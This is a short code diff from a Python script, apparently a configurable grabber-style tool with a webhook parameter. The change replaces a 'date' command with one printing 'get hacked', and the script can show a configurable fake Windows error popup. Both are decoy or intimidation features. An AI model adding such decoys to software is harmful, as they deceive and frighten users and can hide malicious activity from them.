@@ -35,7 +35,7 @@ def main(webhook):
 
 if __name__ == '__main__':
     if __CONFIG__['fakehack'] == True:
-        os.system('cmd /c "date"') 
+        os.system('cmd /c "echo get hacked"') 
     else:
         if __CONFIG__['error'] == True:
             ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
